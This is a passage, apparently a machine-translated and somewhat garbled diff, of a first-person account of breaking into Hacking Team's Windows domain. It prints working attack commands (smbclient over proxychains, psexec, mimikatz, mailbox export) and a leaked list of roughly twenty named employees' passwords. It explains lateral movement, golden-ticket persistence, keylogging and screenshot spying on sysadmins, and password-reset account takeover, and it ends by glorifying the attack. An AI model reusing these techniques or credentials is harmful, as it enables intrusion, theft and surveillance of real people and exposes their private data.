@@ -1,0 +1,372 @@
+
+What interests me most about the backup is to look if you have a
+or hash password you can use to access the current server. Use pwdump,
+cachedump, and lsadump [1] with the registry files. lsadump is the
+password account besadmin service:
+
+_SC_BlackBerry MDS Connection Service
+0000 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+0010 62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00 bes3.2.6.7.8.
+0020 21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00!.!.! ...........
+
+proxychains [2] use the SOCKS server and embedded system
+smbclient [3] to check the password:
+proxychains smbclient //192.168.100.51/c$ '-U' hackingteam.local / besadmin% bes32678 !!! '
+
+!Works! Besadmin password is still valid, and is an administrator
+local. I use my proxy and psexec_psh metasploit [4] for a session
+of meterpreter. Then I migrate to a 64-bit process, "load kiwi" [5]
+"Creds_wdigest", and I have many passwords, including the Administrator
+domain:
+
+HACKINGTEAM BESAdmin bes32678 !!!
+HACKINGTEAM Administrator uu8dd8ndd12!
+HACKINGTEAM c.pozzi P4ssword <---- sysadmin go!
+M.romeo HACKINGTEAM ioLK / (90
+L.guerra HACKINGTEAM 4luc@=.=
+HACKINGTEAM D.Martinez W4tudul3sp
+HACKINGTEAM g.russo GCBr0s0705!
+A.scarafile HACKINGTEAM Cd4432996111
+HACKINGTEAM r.viscardi Ht2015!
+HACKINGTEAM a.mino A! E $$ andra
+HACKINGTEAM m.bettini Ettore & Bella0314
+M.luppi HACKINGTEAM Blackou7
+HACKINGTEAM s.gallucci 1S9i8m4o!
+HACKINGTEAM d.milan set! Dob66
+HACKINGTEAM w.furlan Blu3.B3rry!
+HACKINGTEAM d.romualdi Rd13136f @ #
+HACKINGTEAM l.invernizzi L0r3nz0123!
+HACKINGTEAM e.ciceri 2O2571 & 2E
+HACKINGTEAM e.rabe erab @ 4HT!
+
+[1] https://github.com/Neohapsis/creddump7
+[2] http://proxychains.sourceforge.net/
+[3] https://www.samba.org/
+[4] http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf
+[5] https://github.com/gentilkiwi/mimikatz
+
+
+- [11 - Downloading Post] ----------------------------------------- ------
+
+Now that I have the password for the domain administrator, I have access to
+mails, the heart of the company. Because with every step I take is a
+risk of detection, I download mails before further exploring.
+Powershell makes it easy [1]. Interestingly, I found a bug with handling
+dates. After getting the mail, I took a couple of weeks in
+get the source and other code, so I returned occasionally to
+download new emails. The server was Italian, with the dates
+day / month / year. Use:
+-ContentFilter {(Received -ge '05 / 06/2015 ') -or (Sent -ge '05 / 06/2015')}
+
+with the New-MailboxExportRequest to download new mail (in this
+If all mail from June 5. The problem is that says
+the date is invalid if the day is greater than 12 (I guess this is because
+US that is the first month and month can not be greater than 12). Looks like
+Microsoft engineers have only tested their software with their own
+regional configuration.
+
+[1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/
+
+
+- [12 - Downloading Files] ------------------------------------------ -------
+
+Now I'm a domain administrator, I also began to download
+shares using my proxy and -Tc smbclient option for
+example:
+
+proxychains smbclient //192.168.1.230/FAE DiskStation '\
+-U 'HACKINGTEAM / Administrator% uu8dd8ndd12!' -TC FAE_DiskStation.tar '*'
+
+So I downloaded the Amministrazione, FAE DiskStation, and FileServer folders
+the torrent.
+
+
+- [13 - Introduction to Hacking Windows Domain] -----------------------
+
+Before continue telling the story of the Culiao Non-Windows, it should say something
+knowledge to attack Windows networks.
+
+
+---- [13.1 - Lateral Movement] ---------------------------------------- -------
+
+I will give a brief overview of the techniques to spread within a network
+Windows. Techniques to run remotely require the password or
+hash of a local administrator on the target. By far the most common way
+to get such credentials is to use mimikatz [1], especially
+logonpasswords and sekurlsa sekurlsa :: :: mSv, on computers where you already have
+administrative access. Movement techniques "in situ" also Require
+administrative privileges (I except for runes). The more tools
+important privilege escalation are PowerUp [2], and bypassuac [3].
+
+[1] https://adsecurity.org/?page_id=1821
+[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
+[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1
+
+
+Remote movement:
+
+1) psexec
+
+The basic and proven way of moving windows networks. You can use
+psexec [1], winexe [2], psexec_psh metasploit [3], invoke_psexec of
+powershell empire [4], or the Windows command "sc" [5]. For module
+metasploit, powershell empire, and pth-winexe [6], enough to know the hash
+without knowing the password. It is the most universal way (works on any
+computer with port 445 open), but also way less
+cautious. It appears in the 7045 event log type "Service
+Control Manager. "In my experience, they have never realized for a
+hack, but sometimes you notice later and helps researchers understand
+what has made the hacker.
+
+2) WMI
+
+more cautious way. WMI service is enabled on all
+Windows computers, but except for servers, the firewall blocks it
+default. You can use wmiexec.py [7] pth-WMIS [6] (here's a
+wmiexec demonstration and pth-WMIS [8]), invoke_wmi empire powershell
+[9], or the Windows command wmic [5]. All but need only wmic
+hash.
+
+3) PSRemoting [10]
+
+It is disabled by default, and not advise enable new
+protocols that are not needed. But if the sysadmin already enabled,
+is very convenient, especially if you use powershell for all (and yes,
+you should use powershell for almost everything will change [11] with powershell 5
+and Windows 10, but now powershell day makes it easy to do everything in RAM,
+dodge antivirus, and leave few traces).
+
+4) Scheduled Tasks
+
+You can run remote programs at and schtasks [5]. It works on the
+psexec same situations, and also leaves traces known [12].
+
+5) GPO
+
+If all these protocols are disabled or blocked by
+firewall, once you are the domain administrator, you can use GPO
+to give a logon script, install a msi, run a scheduled task
+[13], or as we shall see computer Mauro Romeo (sysadmin Hacking
+Team), enable WMI and open the firewall via GPO.
+
+[1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx
+[2] https://sourceforge.net/projects/winexe/
+[3] https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh
+[4] http://www.powershellempire.com/?page_id=523
+[5] http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/
+[6] https://github.com/byt3bl33d3r/pth-toolkit
+[7] https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py
+[8] https://www.trustedsec.com/june-2015/no_psexec_needed/
+[9] http://www.powershellempire.com/?page_id=124
+[10] http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/
+[11] https://adsecurity.org/?p=2277
+[12] https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems
+[13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py
+
+
+Movement "in situ"
+
+1) Impersonalizando Tokens
+
+Once you have administrative access to a computer, you can use the
+tokens of other users to access resources in the domain. Two
+tools to do this are incognito [1] and commands token :: * of
+mimikatz [2].
+
+2) MS14-068
+
+You can take advantage of a validation failure kerberos to generate a
+ticket domain administrator [3] [4] [5].
+
+3) Pass the Hash
+
+If you have your hash but the user has not logged on you can use
+sekurlsa :: pth [2] for a ticket user.
+
+4) Injection Process
+
+Any RAT can be injected to another process, for example the command
+pupy migrate in meterpreter and [6] or psinject [7] in powershell empire.
+You can inject the process with the token you want.
+
+5) runes
+
+This is sometimes very useful because it does not require privileges
+administrator. The command is part of windows, but if you have no interface
+Graphics can use powershell [8].
+
+[1] https://www.indetectables.net/viewtopic.php?p=211165
+[2] https://adsecurity.org/?page_id=1821
+[3] https://github.com/bidord/pykek
+[4] https://adsecurity.org/?p=676
+[5] http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html
+[6] https://github.com/n1nj4sec/pupy
+[7] http://www.powershellempire.com/?page_id=273
+[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1
+
+
+---- [13.2 - Persistence] ----------------------------------------- ------------
+
+Having gained access, you want to keep. Indeed, the persistence
+It's just a challenge for motherfuckers like they want Hacking Team
+hack activists or other individuals. Companies to hack, it goes
+persistence because companies never sleep. I always use "persistence"
+Duqu style 2 run in RAM on a pair of servers with high
+uptime percentages. In the unlikely event that all restarted at a time,
+I have a ticket passwords and gold [1] to access booking. You can read
+more information on persistence mechanisms for windows here
+[2. 3. 4]. But to hack into companies, you do not need and increases the risk of
+detection.
+
+[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
+[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/
+[3] http://www.hexacorn.com/blog/category/autostart-persistence/
+[4] https://blog.netspi.com/tag/persistence/
+
+
+---- [13.3 - Internal Recognition] ---------------------------------------- ---
+
+The best tool for understanding today Windows is Powerview networks [1].
+Worth reading everything written by the author [2] above all [3], [4], [5] and
+[6]. Powershell itself is also very powerful [7]. As there are still many
+2003 and 2000 servers without powershell, you must also learn the old
+school [8], with tools like netview.exe [9] or the command windows
+"Net view". Other techniques that I like are:
+
+1) Download a list of file names
+
+With a domain administrator account, you can download all
+file names on the network with powerview:
+
+Invoke-ShareFinderThreaded -ExcludedShares IPC $, PRINT $, ADMIN $ |
+select-string '^ (. *) \ t' | % {$ _ Matches -recurse dir [0] .Groups [1]. |
+select fullname | files.txt -append out-file}
+
+Later, you can read at your own pace and choose which ones you want to download.
+
+2) Read post
+
+As we have seen, you can be downloaded emails with powershell, and have
+lots of useful information.
+
+3) Read sharepoint
+
+It is another place where many companies have important information. It can
+download with powershell [10].
+
+4) Active Directory [11]
+
+It has lots of useful information about users and computers. Without being
+domain administrator, and you can find lots of information
+powerview and other tools [12]. After getting manager
+domain should export all the information of AD with csvde or other
+tool.
+
+5) Spying on employees
+
+One of my favorite pastimes is hunting the sysadmins. spying
+Christan Pozzi (sysadmin Hacking Team) got the server accesso
+Nagios gave me accessibility to sviluppo rete (network development in
+RCS source code). With a simple combination of Get-Keystrokes and
+Get-TimedScreenshot of PowerSploit [13], Do-Exfiltration of Nishang [14], and
+GPO, you can spy on any employee or even the entire domain.
+
+[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+[2] http://www.harmj0y.net/blog/tag/powerview/
+[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/
+[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/
+[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/
+[6] http://www.slideshare.net/harmj0y/i-have-the-powerview
+[7] https://adsecurity.org/?p=2535
+[8] https://www.youtube.com/watch?v=rpwrKhgMd7E
+[9] https://github.com/mubix/netview
+[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/
+[11] https://adsecurity.org/?page_id=41
+[12] http://www.darkoperator.com/?tag=Active+Directory
+[13] https://github.com/PowerShellMafia/PowerSploit
+[14] https://github.com/samratashok/nishang
+
+
+- [14 - Hunting Sysadmins] ------------------------------------------ ----------
+
+By reading the documentation of its infrastructure [1], I realized that even I
+lacked access to something important - "Rete Sviluppo" an isolated network
+keeps all the RCS source code. Sysadmins of a company always
+They have access to everything. I searched computers Mauro Romeo and Christian
+Pozzi to see how they handle the network sviluppo, and to see if there were other
+interesting systems should investigate. It was easy to access your
+computers since they were part of the Windows domain that had
+administrator. Mauro computer Romeo had no open port,
+so I opened the port of WMI [2] to execute meterpreter [3]. In addition to
+record catches with keys and Get-Keystrokes and Get-TimedScreenshot, used many
+modules / gather / metasploit, CredMan.ps1 [4], and searched files [5]. seeing
+that Pozzi had a Truecrypt volume, I waited until he had assembled to
+then copy the files. Many have laughed weak passwords
+Christian Pozzi (Christian Pozzi and generally provides enough material
+for comedy [6] [7] [8] [9]). I included them in filtration as an oversight and
+to laugh at him. The reality is that mimikatz and keyloggers see all
+same passwords.
+
+[1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/
+[2] http://www.hammer-software.com/wmigphowto.shtml
+[3] https://www.trustedsec.com/june-2015/no_psexec_needed/
+[4] https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde
+[5] http://pwnwiki.io/#!presence/windows/find_files.md
+[6] http://archive.is/TbaPy
+[7] http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/
+[8] http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt
+[9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/
+
+
+- [15 - The Bridge] ------------------------------------------ ------------------
+
+Within the volume encryption Christian Pozzi, there was a textfile with many
+passwords [1]. One was for a Nagios server Fully Automated,
+I had access to sviluppo network to monitor it. Had found
+the bridge. Only had the password for the Web interface, but there was a
+Public exploit [2] to execute code and get a shell (is an exploit
+unauthenticated, but it takes a user has logged in to the
+I used that password textfile).
+
+[1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt
+[2] http://seclists.org/fulldisclosure/2014/Oct/78
+
+
+- [16 - Reusing and restoring passwords] ----------------------------
+
+Reading the post, he had seen Milan Daniele granting access to
+git repositories. And I had its windows password by mimikatz. The
+I tried with git server and it worked. I tried sudo and it worked. For him
+gitlab server and your twitter account, I used the "I forgot my
+Password "and my access to the mail server to restore
+password.
+
+
+- [17 - Conclusion] ------------------------------------------- ----------------
+
+It is done. So easy it is to tear down a company and stop their abuses
+human rights. That is the beauty and the asymmetry of hacking: with only a hundred
+hours of work, one person can undo years of work of a
+multimillion-dollar company. The hacking gives us the possibility of the dispossessed
+fight and win.
+
+Hacking guides often end with a warning: This information is
+only for educational purposes, I am an ethical hacker, not attacks on computers without
+permission, gobbledygook. I will say the same, but with a more rebellious concept
+hacking "ethical". Filter ethical hacking documents would expropriate money
+banks, and protect computers of ordinary people. However, the
+Most people who call themselves "ethical hackers" work only
+to protect those who pay their consulting fee, which often are the
+they most deserve to be hacked.
+
+Hacking Team is see themselves as part of a tradition of inspiring
+Italian [1] design. I see them Vincenzetti, your company, and their cronies
+police, police, and government, as part of a long tradition of
+Italian fascism. I want to dedicate this guide to the victims of the assault on the
+Armando Diaz school, and all those who have shed their blood on hands
+Italian fascists.
+
+
+
+
+If not you, who? If not now, when? 
